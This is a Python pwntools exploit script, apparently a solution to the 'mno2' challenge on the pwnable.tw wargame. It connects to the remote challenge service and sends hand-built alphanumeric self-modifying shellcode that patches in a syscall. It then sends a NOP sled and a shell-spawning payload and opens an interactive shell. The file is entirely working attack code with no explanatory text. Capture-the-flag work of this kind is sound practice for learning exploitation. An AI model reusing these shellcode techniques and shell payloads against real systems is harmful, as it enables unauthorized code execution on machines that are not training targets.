from pwn import *
import time


elf = context.binary = ELF('mno2')


def write_to(addr, value, esi):
    tmp = 0
    while(1):
        if(tmp ^ 0x4f == value):
            break
        tmp += 1
    if(esi > tmp):
        pl = b'\x4e'*(esi - tmp)
    elif(esi < tmp):
        pl = b'\x46'*(tmp - esi)
    pl += b'\x31\x35' + p32(addr)
    return pl, tmp

#nc chall.pwnable.tw 10301
#p = remote('127.0.0.1', 1337)
p = remote('chall.pwnable.tw', 10301)
#p = process()
#gdb.attach(p, gdbscript='''break *0x080487e8
#                            break exit
#                            c''')



PUSH_EAX = b'\x50'
INC_ESI = b'\x46'
DEC_ESI = b'\x4e'
DEC_ESI_POPA = b'\x4e\x61'
POP_ECX = b'\x59'
DEC_EAX = b'\x48'
PUSH_EBX = b'\x53'
DEC_EBX = b'\x4b'
PUSH_ESI = b'\x56'


payload = PUSH_EAX
payload += b'\x35\x4D\x6E\x4F\x32' # xor    eax,0x324f6e4d
payload += b'\x35\x4D\x6E\x4F\x32' # xor    eax,0x324f6e4d
payload += PUSH_EAX # ecx
payload += b'\x35\x37\x37\x4F\x32'  # xor eax, 0x324f3737
payload += PUSH_EAX # edx
payload += b'\x35\x37\x37\x4F\x32'  # xor eax, 0x324f3737
payload += b'\x35\x4D\x6E\x4F\x32' # xor    eax,0x324f6e4d
payload += PUSH_EAX # ebx
payload += PUSH_EAX
payload += PUSH_EAX
payload += PUSH_EAX
payload += PUSH_EAX
payload += DEC_ESI_POPA
payload += b'\x35\x4D\x6E\x4F\x32' # xor    eax,0x324f6e4d
payload += INC_ESI*3
payload += PUSH_ESI

pld, esi = write_to(0x324f7343, 0x58, 3)
payload += pld
pld, esi = write_to(0x324f7344, 0xcd, esi)
payload += pld
pld, esi = write_to(0x324f7345, 0x80, esi)
payload += pld

payload += b'\x4f'*0x600

print('len: {}'.format(hex(len(payload))))
p.sendline(payload)

payload = b'\x90'*0x500
shellcode = shellcraft.sh()
payload += asm(shellcode)
p.sendline(payload)
p.interactive()